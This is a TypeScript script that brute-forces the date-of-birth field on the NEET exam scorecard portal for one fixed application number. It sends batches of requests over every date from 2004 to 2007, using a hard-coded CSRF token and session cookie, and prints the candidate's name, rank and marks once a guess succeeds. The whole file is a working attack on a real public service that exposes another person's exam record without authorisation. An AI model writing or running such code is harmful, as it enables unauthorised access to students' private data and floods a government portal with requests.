import axios, { all } from 'axios';
import qs from 'qs';
import cheerio from 'cheerio';

async function solve(appNo: string, day: string, month: string, year: string) {
    let data = qs.stringify({
        '_csrf-frontend': 'ImBIZnWx1LYhIryJgb_NX1AH3mUczRk37tJK_KnySnsbLzwEMvLsj2lujtDX5p5pEUTqVVv5QXG6szyM3scyDw==',
        'Scorecardmodel[ApplicationNumber]': appNo,
        'Scorecardmodel[Day]': day,
        'Scorecardmodel[Month]': month,
        'Scorecardmodel[Year]': year  
      });
      
      let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'https://neet.ntaonline.in/frontend/web/scorecard/index',
        headers: { 
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 
          'Accept-Language': 'en-US,en;q=0.9', 
          'Cache-Control': 'max-age=0', 
          'Connection': 'keep-alive', 
          'Content-Type': 'application/x-www-form-urlencoded', 
          'Cookie': 'advanced-frontend=gv3sdffjldq99ot1l18v0hck0p; _csrf-frontend=3012f8c11c2b63622c4b78f2d669a2c3c59698f024a92fc6d05b26df52e562a6a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%229OtbGC89HL2YVYS6AC40G4XFTavpw5xt%22%3B%7D', 
          'Origin': 'null', 
          'Sec-Fetch-Dest': 'document', 
          'Sec-Fetch-Mode': 'navigate', 
          'Sec-Fetch-Site': 'same-origin', 
          'Sec-Fetch-User': '?1', 
          'Upgrade-Insecure-Requests': '1', 
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36', 
          'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"', 
          'sec-ch-ua-mobile': '?0', 
          'sec-ch-ua-platform': '"Windows"'
        },
        data : data
      };
      try{
          const response = await axios.request(config)
          const parsedData = parseHtml(JSON.stringify(response.data))
          return parsedData;
      } catch(e) {
        return null
      }

      
}

function parseHtml(htmlContent: string) {
    const $ = cheerio.load(htmlContent); 

    const ApplicationNumber = $('td:contains("Application No.")').next('td').text().trim() || 'N/A';
    const CandidateName = $('td:contains("Candidate\'s Name")').next().text().trim() || 'N/A';
    const allIndiaRank = $('td:contains("NEET All India Rank")').next('td').text().trim() || 'N/A';
    const marks = $('td:contains("Total Marks Obtained (out of 720)")').first().next('td').text().trim() || 'N/A';

    // console.log({ApplicationNumber, CandidateName, allIndiaRank, marks});
    
    if(allIndiaRank === 'N/A') {
        return null;
    }

    return ({ApplicationNumber, CandidateName, allIndiaRank, marks})

}

async function main(rollNumber: string) {
    for(let year=2007; year>=2004;year--){
        for(let month=1; month<=12; month++){
            const dataPromises = []
            console.log(`Sending requests for the month ${month} of the year ${year}`)
            for(let day=1; day<=31; day++){
                console.log(`Processing ${rollNumber} for ${year}-${month}-${day}`);                
                const dataPromise = solve(rollNumber, day.toString(), month.toString(), year.toString())
                dataPromises.push(dataPromise)
            }
            const resolvedData = await Promise.all(dataPromises)
            resolvedData.forEach(data => {
                if(data){
                    console.log(data)
                    process.exit(1)
                }
            
            })
        }
    }
}
main("240411183517")